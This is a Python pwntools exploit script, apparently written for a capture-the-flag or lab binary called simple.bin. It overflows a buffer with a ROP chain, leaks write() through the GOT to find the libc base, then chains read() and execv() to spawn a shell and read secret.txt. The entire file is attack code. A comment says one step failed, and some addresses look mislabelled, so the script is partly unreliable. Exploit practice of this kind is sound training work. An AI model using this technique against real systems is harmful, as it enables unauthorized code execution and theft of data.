#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./simple.bin")

    rop = ROP("./simple.bin")
    print(rop.rdi)
    print(rop.rsi)
    rdi_gadget = p64(0x400673)
    rsi_gadget = p64(0x400671)

    # Investigate the libc library.
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    write_offset = libc.symbols['write']
    read_offset = libc.symbols['read']
    execv_offset = libc.symbols['execv']
    print("Offset of write() within libc library: %s" % hex(write_offset))
    print("Offset of read() within libc library: %s" % hex(read_offset))
    print("Offset of execv() within libc library: %s" % hex(execv_offset))

    main = p64(0x4005fe)
    f = p64(0x4005b6)
    gbuf = p64(0x601080)
    write_plt = p64(0x4005d3)
    write_got = p64(0x400470)
    read_plt = p64(0x400490)

    print(p.recvline())
    p.sendline(b"A" * 0x18 + rdi_gadget + p64(0x1) + rsi_gadget + write_got + p64(0x00) + write_plt)
    leaked = p.recv(8)
    p.recv(136)
    write_addr = int.from_bytes(leaked, byteorder='little')
    libc_base = write_addr - write_offset
    execv_addr = libc_base + execv_offset
    execv = execv_addr.to_bytes(8, 'little')
    print("execv: {}".format(execv))

    # Need to call f() again to get "/bin/sh" into memory, but failed to do so.
    payload = b"A" * 0x18
    payload += rsi_gadget + gbuf + p64(0x00) + read_plt
    payload += rdi_gadget + gbuf + rsi_gadget + p64(0x00) + p64(0x00) + execv
    p.sendline(payload)

    sleep(0.2)
    p.sendline(b"/bin/sh\x00")

    # Spawn shell.
    sleep(0.2)
    p.sendline(b"cat secret.txt")
    print(p.recvline())


if __name__ == "__main__":
    exploit()